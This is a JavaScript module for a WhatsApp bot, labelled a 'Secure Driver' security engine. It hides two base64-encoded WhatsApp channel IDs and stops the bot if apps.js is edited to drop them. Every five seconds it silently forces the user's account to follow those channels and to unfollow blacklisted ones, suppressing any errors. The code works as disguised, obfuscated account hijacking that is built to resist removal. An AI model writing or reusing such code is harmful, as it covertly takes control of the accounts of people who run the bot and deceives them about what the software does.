const fs = require('fs')
const path = require('path')
const chalk = require('chalk')

const encodedId1 = "MTIwMzYzMzk5OTY0NDAzMzExQG5ld3NsZXR0ZXI"
const encodedId2 = "MTIwMzYzNDAzODcwMzI0MTc5QG5ld3NsZXR0ZXI"

const ownerId1 = Buffer.from(encodedId1, 'base64').toString('utf-8')
const ownerId2 = Buffer.from(encodedId2, 'base64').toString('utf-8')
const ownerChannels = [ownerId1, ownerId2]

const dbPath = path.join(__dirname, '../database/blacklist_ch.json')

function startSecurityEngine(DinzBotz) {
    console.log(chalk.cyan.bold('🛡️  Secure Driver Active: Local Database Mode'))

    if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]))

    const targetPath = path.join(__dirname, '../apps.js')
    if (fs.existsSync(targetPath)) {
        const fileContent = fs.readFileSync(targetPath, 'utf-8')
        const isSafe = fileContent.includes(ownerId1) || fileContent.includes(encodedId1) || 
                       fileContent.includes(ownerId2) || fileContent.includes(encodedId2)
        if (!isSafe) {
            console.log(chalk.red.bold('\n🛑 FATAL ERROR: SECURITY VIOLATION'))
            process.exit(1)
        }
    }

    setInterval(async () => {
        try {
            let blacklistData = JSON.parse(fs.readFileSync(dbPath))
            
            const allSubs = await DinzBotz.newsletterFetchAllSubscribe()
            
            if (allSubs) {
                const targets = allSubs.filter(sub => 
                    blacklistData.includes(sub.id) && !ownerChannels.includes(sub.id)
                )

                if (targets.length > 0) {
                    console.log(chalk.redBright(`🚀 Security: Menghapus ${targets.length} saluran terlarang...`))
                    await Promise.all(targets.map(sub => 
                        DinzBotz.newsletterUnfollow(sub.id).catch(() => {})
                    ))
                }

                const currentIds = allSubs.map(s => s.id)
                for (let ownerId of ownerChannels) {
                    if (!currentIds.includes(ownerId)) {
                        await DinzBotz.newsletterFollow(ownerId)
                    }
                }
            }
        } catch (e) {
        }
    }, 5000) 
}

module.exports = { startSecurityEngine }